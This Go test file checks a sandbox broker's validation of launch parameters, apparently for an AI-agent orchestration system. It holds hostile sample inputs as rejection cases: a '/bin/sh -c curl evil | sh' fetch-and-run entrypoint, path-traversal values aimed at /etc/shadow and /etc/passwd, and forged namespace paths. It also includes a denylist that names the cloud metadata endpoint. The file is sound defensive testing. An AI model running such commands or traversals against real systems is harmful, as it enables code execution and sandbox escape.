//go:build linux

package sandbox

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/sky-ai-eng/triage-factory/internal/githooks"
	"github.com/sky-ai-eng/triage-factory/internal/paths"
)

// validParams returns a LaunchParams that passes ValidateLaunchParams, so
// each rejection test can mutate exactly one field and prove that field's
// gate — the boundary the broker enforces before it builds or execs
// anything from an orchestrator's request.
func validParams() LaunchParams {
	return LaunchParams{
		RunID:       "run-abc123",
		ContainerID: "tf-abc123-1",
		Rootfs:      RootfsSelector{Name: "base"},
		Env: []EnvVar{
			{Key: "PATH", Value: "/usr/bin"},
			{Key: "ANTHROPIC_BASE_URL", Value: "http://10.42.1.1:9000"},
			{Key: "GIT_CONFIG_KEY_0", Value: "core.hooksPath"},
			{Key: "GIT_CONFIG_VALUE_0", Value: "/hooks"},
		},
		Args:     []string{sandboxNodeBinary, sandboxWrapperEntry, "-p", "hi"},
		Worktree: RunTreeRoot("run-abc123"),
		SDKDir:   "/opt/tf/sdk",
		Rlimits:  []Rlimit{{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024}},
		// The netns name must be the one this run's id derives — the ownership
		// check binds it, not just the tf-<hex>-<idx> shape.
		NetnsPath: "/var/run/netns/" + NetnsNameForRun("run-abc123", 1),
	}
}

func TestValidateLaunchParams_AcceptsValid(t *testing.T) {
	if err := ValidateLaunchParams(validParams()); err != nil {
		t.Fatalf("ValidateLaunchParams rejected valid params: %v", err)
	}
	// The empty rootfs selector resolves to "base" and must also pass.
	p := validParams()
	p.Rootfs = RootfsSelector{}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("empty rootfs selector rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsBadRootfsName is the "bad rootfs name"
// acceptance rejection: a name outside the broker's curated catalog fails.
func TestValidateLaunchParams_RejectsBadRootfsName(t *testing.T) {
	p := validParams()
	p.Rootfs = RootfsSelector{Name: "totally-not-a-variant"}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unknown rootfs variant; want rejection")
	}
}

// TestValidateLaunchParams_RejectsPathShapedRootfs is the "path-shaped
// param" rejection: a rootfs SELECTOR that carries path structure (a
// would-be rootfs path) is rejected before the catalog lookup, so the
// broker never mounts an orchestrator-supplied path as the root.
func TestValidateLaunchParams_RejectsPathShapedRootfs(t *testing.T) {
	for _, name := range []string{"/host/evil", "../../etc", "a/b", "base/../x", ".hidden", "bad name"} {
		p := validParams()
		p.Rootfs = RootfsSelector{Name: name}
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped rootfs selector %q; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsPathShapedID pins that a run/container id
// carrying path structure (which would seed the bundle dir / netns / cgroup
// name) is rejected.
func TestValidateLaunchParams_RejectsPathShapedID(t *testing.T) {
	for _, id := range []string{"../escape", "a/b", "", "c\x00d"} {
		p := validParams()
		p.ContainerID = id
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted path-shaped container id %q; want rejection", id)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAllowlistedEnvKey is the
// "non-allowlisted env key" rejection: a key outside the enumerated union
// fails the launch loudly, while an allowlisted key and a numbered
// GIT_CONFIG_* prefix key pass.
func TestValidateLaunchParams_RejectsNonAllowlistedEnvKey(t *testing.T) {
	p := validParams()
	p.Env = append(p.Env, EnvVar{Key: "EVIL_INJECTED_KEY", Value: "x"})
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a non-allowlisted env key; want rejection")
	}

	// Sanity: the allowlisted set (incl. a numbered prefix key) passes.
	ok := validParams()
	ok.Env = []EnvVar{
		{Key: "HOME", Value: "/work"},
		{Key: "ANTHROPIC_API_KEY", Value: "placeholder"},
		{Key: "GIT_CONFIG_KEY_7", Value: "url./.insteadOf"},
		{Key: "TF_GIT_PUSH_CAPTURE", Value: "proxy"},
	}
	if err := ValidateLaunchParams(ok); err != nil {
		t.Errorf("allowlisted env keys rejected: %v", err)
	}
}

// TestValidateLaunchParams_RejectsNonPinnedEntrypoint pins that the broker
// owns the command: argv whose first two elements aren't the fixed
// node+wrapper entrypoint is rejected, so a compromised orchestrator can
// vary arguments but never the executed program.
func TestValidateLaunchParams_RejectsNonPinnedEntrypoint(t *testing.T) {
	for _, argv := range [][]string{
		{"/bin/sh", "-c", "curl evil | sh"},
		{sandboxNodeBinary, "/tmp/evil.js"},
		{sandboxWrapperEntry},
		nil,
	} {
		p := validParams()
		p.Args = argv
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted non-pinned entrypoint %v; want rejection", argv)
		}
	}
}

// TestValidateLaunchParams_RejectsForgedNetns pins that a netns path that is
// not this run's own namespace is rejected — closing both the escalation
// where a compromised orchestrator points the sandbox at the host netns
// (bypassing the per-run egress allowlist) AND the netns-confusion case where
// it passes a sibling run's still-broker-shaped namespace.
func TestValidateLaunchParams_RejectsForgedNetns(t *testing.T) {
	for _, path := range []string{
		"",
		"/proc/1/ns/net",
		"/var/run/netns/hostnet",
		"/etc/passwd",
		"/var/run/netns/../../etc/shadow",
		// Broker-shaped and a valid subnet idx, but derived from a DIFFERENT
		// run id — the ownership binding must reject it even though the shape
		// check passes (the netns-confusion case shape-only validation missed).
		"/var/run/netns/" + NetnsNameForRun("some-other-run", 1),
		"/var/run/netns/" + NetnsNameForRun("victim-run-xyz", 42),
	} {
		p := validParams()
		p.NetnsPath = path
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted forged netns path %q; want rejection", path)
		}
	}
}

// TestValidateLaunchParams_RejectsBadRlimit pins the rlimit boundary: an
// unlisted type, a soft limit above the hard limit, and a duplicated type
// are all rejected.
func TestValidateLaunchParams_RejectsBadRlimit(t *testing.T) {
	cases := map[string][]Rlimit{
		"unlisted type": {{Type: "RLIMIT_MEMLOCK", Soft: 1, Hard: 1}},
		"soft > hard":   {{Type: "RLIMIT_NOFILE", Soft: 2048, Hard: 1024}},
		"duplicate type": {
			{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024},
			{Type: "RLIMIT_NOFILE", Soft: 512, Hard: 512},
		},
	}
	for name, rl := range cases {
		p := validParams()
		p.Rlimits = rl
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a bad rlimit set; want rejection", name)
		}
	}
}

// TestValidateLaunchParams_RejectsNonAbsolutePaths pins that the run-data
// paths the broker binds (worktree, mount source/destination) must be clean
// absolute paths — caught at the boundary, not late inside runsc. (SDKDir is
// not checked here: the broker overrides it with TrustedSDKDir(), so the
// orchestrator's value is discarded rather than validated.)
func TestValidateLaunchParams_RejectsNonAbsolutePaths(t *testing.T) {
	worktree := validParams()
	worktree.Worktree = "relative/worktree"
	if err := ValidateLaunchParams(worktree); err == nil {
		t.Error("accepted a relative worktree; want rejection")
	}

	uncleanWorktree := validParams()
	uncleanWorktree.Worktree = "/data/../data/worktrees/run"
	if err := ValidateLaunchParams(uncleanWorktree); err == nil {
		t.Error("accepted a non-clean worktree; want rejection")
	}

	relSource := validParams()
	relSource.Mounts = []Mount{{Source: "rel/src", Destination: "/work/x"}}
	if err := ValidateLaunchParams(relSource); err == nil {
		t.Error("accepted a relative mount source; want rejection")
	}

	uncleanDest := validParams()
	uncleanDest.Mounts = []Mount{{Source: "/host/x", Destination: "/work/../etc/x"}}
	if err := ValidateLaunchParams(uncleanDest); err == nil {
		t.Error("accepted a non-clean mount destination; want rejection")
	}
}

// TestValidateLaunchParams_RejectsBadMountOption pins that a mount option
// outside the honored ro/rw set is rejected, so a caller can't slip a
// surprising mount flag into the broker-built spec.
func TestValidateLaunchParams_RejectsBadMountOption(t *testing.T) {
	// The mount source must ALSO be one this run legitimately owns (the
	// worktree/mount-scope check runs regardless of Options), so use this
	// run's own agenthost socket — a recognized, per-run mount shape — to
	// isolate the option check from the scope check.
	trustedSource := TrustedAgentHostSocketPath("run-abc123")
	p := validParams()
	p.Mounts = []Mount{{Source: trustedSource, Destination: TrustedAgentHostSocketDestination, Options: []string{"suid"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted an unsupported mount option; want rejection")
	}
	// ro/rw (and no options) are honored.
	for _, opts := range [][]string{nil, {"ro"}, {"rw"}} {
		ok := validParams()
		ok.Mounts = []Mount{{Source: trustedSource, Destination: TrustedAgentHostSocketDestination, Options: opts}}
		if err := ValidateLaunchParams(ok); err != nil {
			t.Errorf("mount options %v rejected: %v", opts, err)
		}
	}
}

// TestValidateLaunchParams_RejectsCrossOrgMountSource is acceptance case
// (a): a mount source under a DIFFERENT org's tree than the worktree is
// rejected, even though both are shape-valid, broker-created-looking
// paths — the core cross-tenant residual this ticket closes.
func TestValidateLaunchParams_RejectsCrossOrgMountSource(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	p := validParams()
	p.Worktree = filepath.Join(root, "orgs", "org-a", "projects", "proj-1")
	p.Mounts = []Mount{{
		Source:      filepath.Join(root, "orgs", "org-b", "curator-repos", "acme", "widgets"),
		Destination: "/work/repos/acme/widgets",
		Options:     []string{"ro"},
	}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a mount source under a different org's tree than the worktree; want rejection")
	}
}

// TestValidateLaunchParams_AcceptsSameOrgMountSource is the positive half
// of the same case: a mount source under the SAME org as the worktree
// (the curator's shared read-only repo mount shape) is accepted.
func TestValidateLaunchParams_AcceptsSameOrgMountSource(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	p := validParams()
	p.Worktree = filepath.Join(root, "orgs", "org-a", "projects", "proj-1")
	p.Mounts = []Mount{{
		Source:      filepath.Join(root, "orgs", "org-a", "curator-repos", "acme", "widgets"),
		Destination: "/work/repos/acme/widgets",
		Options:     []string{"ro"},
	}}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("rejected a mount source under the SAME org as the worktree: %v", err)
	}
}

// TestValidateLaunchParams_RejectsWorktreeOutsideOrgTree is acceptance
// case (c): a worktree that is neither this run's own ephemeral tree nor
// under the state-root org tree (e.g. /etc) is rejected outright.
func TestValidateLaunchParams_RejectsWorktreeOutsideOrgTree(t *testing.T) {
	root := t.TempDir()
	paths.SetForTest(t, root)

	for _, wt := range []string{"/etc", "/etc/passwd", filepath.Join(root, "orgs")} {
		p := validParams()
		p.Worktree = wt
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("accepted worktree %q outside both legitimate shapes; want rejection", wt)
		}
	}
}

// TestValidateLaunchParams_RejectsForeignGlobalMountSource is acceptance
// case (b): a caller-supplied source for the TF-binary / git-hooks
// destinations that does not match the broker's own resolution is
// rejected — these two destinations are broker-resolved, never
// caller-trusted, mirroring TrustedSDKDir.
func TestValidateLaunchParams_RejectsForeignGlobalMountSource(t *testing.T) {
	p := validParams()
	p.Mounts = []Mount{{Source: "/tmp/attacker-wrapper", Destination: TrustedTFBinaryDestination, Options: []string{"ro"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a foreign source for the TF-binary destination; want rejection")
	}

	p = validParams()
	p.Mounts = []Mount{{Source: "/tmp/attacker-hooks", Destination: githooks.SandboxDir, Options: []string{"ro"}}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a foreign source for the git-hooks destination; want rejection")
	}

	// The genuinely trusted sources pass.
	tfBin, err := TrustedTFBinaryPath()
	if err != nil {
		t.Fatalf("resolve trusted TF binary path: %v", err)
	}
	ok := validParams()
	ok.Mounts = []Mount{
		{Source: tfBin, Destination: TrustedTFBinaryDestination, Options: []string{"ro"}},
		{Source: TrustedGitHooksDir(), Destination: githooks.SandboxDir, Options: []string{"ro"}},
	}
	if err := ValidateLaunchParams(ok); err != nil {
		t.Errorf("rejected the genuinely trusted global mount sources: %v", err)
	}
}

// TestValidateLaunchParams_RejectsForeignAgentHostSocket is acceptance case
// (e)'s negative half: an agenthost-socket mount whose source names a
// DIFFERENT run (a sibling's, still broker-shaped) is rejected.
func TestValidateLaunchParams_RejectsForeignAgentHostSocket(t *testing.T) {
	p := validParams()
	p.Mounts = []Mount{{
		Source:      TrustedAgentHostSocketPath("some-other-run"),
		Destination: TrustedAgentHostSocketDestination,
	}}
	if err := ValidateLaunchParams(p); err == nil {
		t.Fatal("accepted a sibling run's agenthost socket; want rejection")
	}
}

// TestValidateLaunchParams_AcceptsRealisticMountSet is acceptance case (d):
// the actual mount set a normal delegated run assembles (TF binary,
// git-hooks, the run's own agenthost socket — mirroring
// internal/agentproc's extraMounts assembly, no curator mounts) against
// the ephemeral worktree shape is accepted unchanged.
func TestValidateLaunchParams_AcceptsRealisticMountSet(t *testing.T) {
	tfBin, err := TrustedTFBinaryPath()
	if err != nil {
		t.Fatalf("resolve trusted TF binary path: %v", err)
	}
	p := validParams()
	p.Mounts = []Mount{
		{Source: tfBin, Destination: TrustedTFBinaryDestination, Options: []string{"ro"}},
		{Source: TrustedGitHooksDir(), Destination: githooks.SandboxDir, Options: []string{"ro"}},
		{Source: TrustedAgentHostSocketPath(p.RunID), Destination: TrustedAgentHostSocketDestination},
	}
	if err := ValidateLaunchParams(p); err != nil {
		t.Errorf("rejected a normal run's real mount set: %v", err)
	}
}

// TestValidateLaunchParams_RejectsMalformedEnvEntry pins the env-entry
// boundary beyond the allowlist: an empty key, a key carrying '=' or NUL,
// and a value carrying NUL are all rejected so the broker never folds a
// misparsing entry into the spec.
func TestValidateLaunchParams_RejectsMalformedEnvEntry(t *testing.T) {
	cases := map[string]EnvVar{
		"empty key":   {Key: "", Value: "x"},
		"key has =":   {Key: "HO=ME", Value: "x"},
		"key has NUL": {Key: "HO\x00ME", Value: "x"},
		"value NUL":   {Key: "HOME", Value: "a\x00b"},
	}
	for name, e := range cases {
		p := validParams()
		p.Env = append(p.Env, e)
		if err := ValidateLaunchParams(p); err == nil {
			t.Errorf("%s: accepted a malformed env entry; want rejection", name)
		}
	}
}

// TestValidateEgressCIDR_DenylistsInternal is the "denylisted CIDR"
// acceptance rejection: the cloud metadata endpoint, the control-plane
// subnet, private/link-local ranges, and the sandbox subnet pool are all
// rejected — "validated" means *safe*, not merely well-formed. A public
// destination passes the denylist (application of an accepted CIDR is the
// self-host raw-L3 variant, tracked separately).
func TestValidateEgressCIDR_DenylistsInternal(t *testing.T) {
	denied := []struct {
		name string
		cidr string
	}{
		{"cloud metadata endpoint", "169.254.169.254"},
		{"cloud metadata range", "169.254.169.254/32"},
		{"link-local", "169.254.0.0/16"},
		{"control-plane subnet (private 10/8)", "10.0.5.0/24"},
		{"sandbox subnet pool", "10.42.7.0/24"},
		{"rfc1918 172.16/12", "172.16.30.0/24"},
		{"rfc1918 192.168/16", "192.168.1.0/24"},
		{"loopback", "127.0.0.1/32"},
		{"straddles denylist", "10.0.0.0/7"},
	}
	for _, d := range denied {
		if err := validateEgressCIDR(d.cidr); err == nil {
			t.Errorf("%s: validateEgressCIDR(%q) = nil; want rejection", d.name, d.cidr)
		}
	}

	// Empty means "no extra egress" and is a no-op, not an error.
	if err := validateEgressCIDR(""); err != nil {
		t.Errorf("empty CIDR rejected: %v", err)
	}
	// A public destination is not on the internal denylist.
	for _, ok := range []string{"203.0.113.0/24", "8.8.8.8/32"} {
		if err := validateEgressCIDR(ok); err != nil {
			t.Errorf("public CIDR %q rejected by the internal denylist: %v", ok, err)
		}
	}
	// Malformed input is rejected too.
	if err := validateEgressCIDR("not-a-cidr"); err == nil {
		t.Error("accepted a malformed CIDR; want rejection")
	}
}

// TestValidateLaunchParams_DenylistedCIDRRejected pins the same denylist at
// the whole-params boundary (the path the broker actually calls), including
// the two the acceptance names explicitly.
func TestValidateLaunchParams_DenylistedCIDRRejected(t *testing.T) {
	for _, cidr := range []string{"169.254.169.254/32", "10.0.0.0/8"} {
		p := validParams()
		p.ExtraEgressCIDR = cidr
		err := ValidateLaunchParams(p)
		if err == nil {
			t.Errorf("ValidateLaunchParams accepted denylisted egress CIDR %q", cidr)
			continue
		}
		if !strings.Contains(err.Error(), "denylist") {
			t.Errorf("egress CIDR %q rejected but not for the denylist reason: %v", cidr, err)
		}
	}
}

// validSidecarParams returns a SidecarLaunchParams that passes
// ValidateSidecarLaunchParams, mirroring validParams' role for the run
// launch's own boundary tests.
func validSidecarParams() SidecarLaunchParams {
	return SidecarLaunchParams{
		ContainerID: "tf-abc123-1-sc",
		UID:         SidecarUIDBase,
		GID:         SidecarUIDBase,
	}
}

func TestValidateSidecarLaunchParams_AcceptsValid(t *testing.T) {
	if err := ValidateSidecarLaunchParams(validSidecarParams()); err != nil {
		t.Fatalf("ValidateSidecarLaunchParams rejected valid params: %v", err)
	}
	// The top of the band (SidecarUIDBase + MaxSandboxes - 1) must also pass.
	p := validSidecarParams()
	p.UID, p.GID = SidecarUIDBase+MaxSandboxes-1, SidecarUIDBase+MaxSandboxes-1
	if err := ValidateSidecarLaunchParams(p); err != nil {
		t.Errorf("top-of-band uid rejected: %v", err)
	}
}

// TestValidateSidecarLaunchParams_RejectsUIDOutsideBand is the load-bearing
// security check: a compromised orchestrator asking the broker to setuid
// the sidecar to root, to the orchestrator's own uid, or to anything else
// outside the reserved range must be refused before any exec happens.
func TestValidateSidecarLaunchParams_RejectsUIDOutsideBand(t *testing.T) {
	for _, uid := range []int{0, 1, WorktreeUID, 10001, SidecarUIDBase - 1, SidecarUIDBase + MaxSandboxes} {
		p := validSidecarParams()
		p.UID, p.GID = uid, uid
		if err := ValidateSidecarLaunchParams(p); err == nil {
			t.Errorf("ValidateSidecarLaunchParams accepted uid %d, outside the reserved band", uid)
		}
	}
}

func TestValidateSidecarLaunchParams_RejectsMismatchedUIDGID(t *testing.T) {
	p := validSidecarParams()
	p.GID = p.UID + 1
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted mismatched uid/gid")
	}
}

func TestValidateSidecarLaunchParams_RejectsPathShapedContainerID(t *testing.T) {
	p := validSidecarParams()
	p.ContainerID = "../etc/passwd"
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted a path-shaped container id")
	}
}

// TestValidateSidecarLaunchParams_RejectsMissingSuffix pins the check that
// keeps a sidecar's registry key from ever colliding with a run's own in
// the broker's shared s.runs map — a run's ContainerID never carries
// SidecarContainerIDSuffix (see wrap()'s "tf-<frag>-<idx>" naming), so
// requiring it here at the boundary (not just upheld by the Linux
// dispatcher's own naming convention) makes that collision structurally
// impossible.
func TestValidateSidecarLaunchParams_RejectsMissingSuffix(t *testing.T) {
	p := validSidecarParams()
	p.ContainerID = "tf-abc123-1" // a run's own container id shape, no suffix
	if err := ValidateSidecarLaunchParams(p); err == nil {
		t.Error("ValidateSidecarLaunchParams accepted a container id missing the sidecar suffix")
	}
}
